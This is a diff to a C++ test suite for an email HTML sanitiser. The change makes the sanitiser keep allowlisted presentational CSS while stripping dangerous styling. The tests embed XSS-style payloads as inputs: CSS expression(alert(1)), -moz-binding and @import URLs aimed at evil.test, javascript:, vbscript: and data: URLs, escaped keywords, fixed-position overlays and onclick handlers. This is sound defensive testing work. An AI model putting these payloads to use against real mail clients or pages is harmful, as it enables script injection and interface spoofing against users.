@@ -185,12 +185,17 @@ TEST(Sanitize, KeepsTableStructure) {
   EXPECT_TRUE(contains(html, "cell"));
 }
 
-TEST(Sanitize, DropsStyleAndClassAttributes) {
-  // Inline CSS can fetch remote resources and overlay the interface.
-  const auto html = clean("<p style=\"background:url(http://evil)\" class=\"x\">t</p>");
-  EXPECT_FALSE(contains(html, "style"));
-  EXPECT_FALSE(contains(html, "evil"));
+TEST(Sanitize, DropsClassAndFiltersStyle) {
+  // This test used to assert that `style` was dropped wholesale. That policy
+  // cost every message its design — see the Style suite — so `style` is now
+  // filtered against a property allowlist instead of discarded.
+  //
+  // `class` is still dropped: without a stylesheet it does nothing, and
+  // admitting one means admitting <style>, which this sanitiser cannot parse.
+  const auto html = clean("<p style=\"color:red;position:fixed\" class=\"x\">t</p>");
   EXPECT_FALSE(contains(html, "class"));
+  EXPECT_TRUE(contains(html, "color:red"));
+  EXPECT_FALSE(contains(html, "position"));
   EXPECT_TRUE(contains(html, "t"));
 }
 
@@ -425,4 +430,100 @@ TEST(Padding, SanitizeCollapsesPadding) {
   EXPECT_FALSE(contains(result.html, "shy"));
   EXPECT_TRUE(contains(result.html, "Deal"));
   EXPECT_TRUE(contains(result.html, "inside"));
+}
+
+// MARK: - Presentational styling
+//
+// Mail is a styled document. Stripping every presentational attribute left
+// navy header bars, orange buttons and hero images rendering as a flat stack
+// of blue underlined links -- correct, inert, and nothing like the message the
+// sender wrote. These tests hold the line between "styled" and "dangerous".
+
+TEST(Style, KeepsOrdinaryDeclarations) {
+  const auto out = sanitize(
+      R"(<td style="background-color:#003057;color:#fff;text-align:center">x</td>)");
+  EXPECT_TRUE(contains(out.html, "background-color:#003057"));
+  EXPECT_TRUE(contains(out.html, "color:#fff"));
+  EXPECT_TRUE(contains(out.html, "text-align:center"));
+}
+
+TEST(Style, KeepsPresentationalAttributes) {
+  const auto out = sanitize(
+      R"(<table bgcolor="#003057" width="600" align="center" cellpadding="0">)"
+      R"(<tr><td valign="top" height="40">x</td></tr></table>)");
+  EXPECT_TRUE(contains(out.html, "bgcolor=\"#003057\""));
+  EXPECT_TRUE(contains(out.html, "width=\"600\""));
+  EXPECT_TRUE(contains(out.html, "align=\"center\""));
+  EXPECT_TRUE(contains(out.html, "valign=\"top\""));
+}
+
+TEST(Style, DropsScriptingProperties) {
+  // IE-era CSS expressions are executable content wearing a style attribute.
+  const auto out = sanitize(
+      R"CSS(<div style="width:expression(alert(1));color:red">x</div>)CSS");
+  EXPECT_FALSE(contains(out.html, "expression"));
+  EXPECT_TRUE(contains(out.html, "color:red"));
+  EXPECT_TRUE(out.removed_active_content);
+}
+
+TEST(Style, DropsBehaviourAndBinding) {
+  for (const std::string attack : {"behavior:url(#default#time2)",
+                                   "-moz-binding:url(http://evil.test/x.xml)"}) {
+    const auto out = sanitize("<div style=\"" + attack + "\">x</div>");
+    EXPECT_FALSE(contains(out.html, "behavior"));
+    EXPECT_FALSE(contains(out.html, "binding"));
+  }
+}
+
+TEST(Style, DropsPositioningThatCouldOverlayTheInterface) {
+  // A fixed overlay is how a message would try to draw fake app chrome.
+  const auto out = sanitize(
+      R"(<div style="position:fixed;top:0;left:0;z-index:9999;color:red">x</div>)");
+  EXPECT_FALSE(contains(out.html, "position"));
+  EXPECT_FALSE(contains(out.html, "z-index"));
+  EXPECT_TRUE(contains(out.html, "color:red"));
+}
+
+TEST(Style, AllowsImageUrlsButOnlySafeSchemes) {
+  // Hero images in mail are CSS backgrounds. The scheme is checked here; the
+  // CSP decides whether the fetch is actually permitted at render time.
+  const auto ok = sanitize(
+      R"CSS(<td style="background-image:url(https://cdn.test/hero.jpg)">x</td>)CSS");
+  EXPECT_TRUE(contains(ok.html, "background-image:url(https://cdn.test/hero.jpg)"));
+
+  for (const std::string attack : {"background-image:url(javascript:alert(1))",
+                                   "background:url('vbscript:x')",
+                                   "background-image:url(\"data:text/html,<script>\")"}) {
+    const auto out = sanitize("<div style=\"" + attack + "\">x</div>");
+    EXPECT_FALSE(contains(out.html, "javascript"));
+    EXPECT_FALSE(contains(out.html, "vbscript"));
+    EXPECT_FALSE(contains(out.html, "text/html"));
+  }
+}
+
+TEST(Style, DropsImportAndEscapes) {
+  // Backslash escapes are the standard way to spell a blocked keyword.
+  const auto out = sanitize(
+      R"CSS(<div style="color:\65 xpression(alert(1));background:red">x</div>)CSS");
+  EXPECT_FALSE(contains(out.html, "\\65"));
+  const auto imported = sanitize(R"CSS(<div style="@import url(http://evil.test)">x</div>)CSS");
+  EXPECT_FALSE(contains(imported.html, "@import"));
+}
+
+TEST(Style, StillDropsClassAndStyleBlocks) {
+  // `class` without a stylesheet is dead weight, and a <style> block is a
+  // whole CSS surface -- selectors, media queries, @import -- that this
+  // sanitiser does not parse and therefore cannot vouch for.
+  const auto out = sanitize(R"(<style>.a{color:red}</style><div class="a">x</div>)");
+  EXPECT_FALSE(contains(out.html, "class="));
+  EXPECT_FALSE(contains(out.html, "color:red"));
+}
+
+TEST(Style, StillDropsEventHandlersAlongsideStyle) {
+  const auto out = sanitize(
+      R"CSS(<div style="color:red" onclick="alert(1)" onmouseover="x()">hi</div>)CSS");
+  EXPECT_TRUE(contains(out.html, "color:red"));
+  EXPECT_FALSE(contains(out.html, "onclick"));
+  EXPECT_FALSE(contains(out.html, "onmouseover"));
+  EXPECT_TRUE(out.removed_active_content);
 }
